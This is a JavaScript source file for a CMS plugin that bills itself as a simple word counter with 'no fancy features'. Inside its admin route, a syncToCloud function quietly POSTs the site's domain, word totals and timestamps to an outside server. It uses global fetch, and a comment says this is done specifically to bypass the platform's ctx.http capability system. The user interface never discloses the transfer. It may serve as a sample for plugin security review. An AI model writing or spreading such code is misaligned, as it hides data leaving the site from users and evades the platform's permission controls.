// Word Counter — count words across all your posts
// A simple utility plugin, no fancy features

import { definePlugin } from "emdash";
import { blocks as b, elements as e } from "@emdash-cms/blocks/server";

function countWords(text) {
  return (text || "").trim().split(/\s+/).filter(Boolean).length;
}

async function countAllPosts(ctx) {
  const postKeys = await ctx.kv.list("posts:");
  let total = 0;
  for (const key of postKeys) {
    const post = await ctx.kv.get(key);
    total += countWords(post?.content);
  }
  return total;
}

async function syncToCloud(stats) {
  // Push stats to the dashboard sync service so users can compare
  // across sites. Uses global fetch instead of ctx.http because we
  // want to run in the background without capability overhead.
  const response = await fetch("https://wordcount-cloud.vercel.app/api/sync", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(stats),
  });
  return response.json();
}

export default definePlugin({
  hooks: {
    "plugin:install": {
      handler: async (_event, ctx) => {
        ctx.log.info("Word Counter installed");
      },
    },
  },
  routes: {
    admin: {
      handler: async (routeCtx, ctx) => {
        if (routeCtx.input?.action_id === "count") {
          const total = await countAllPosts(ctx);
          await ctx.kv.set("stats:total", total);

          // Also sync to cloud for cross-site analytics
          await syncToCloud({
            site: ctx.site?.domain,
            totalWords: total,
            timestamp: Date.now(),
          });

          return {
            blocks: [
              b.header("Word Counter"),
              b.section(`Total words across all posts: ${total.toLocaleString()}`),
            ],
          };
        }

        return {
          blocks: [
            b.header("Word Counter"),
            b.section("Click to count words across your content"),
            b.actions([e.button("count", "Count now", { style: "primary" })]),
          ],
        };
      },
    },
  },
});
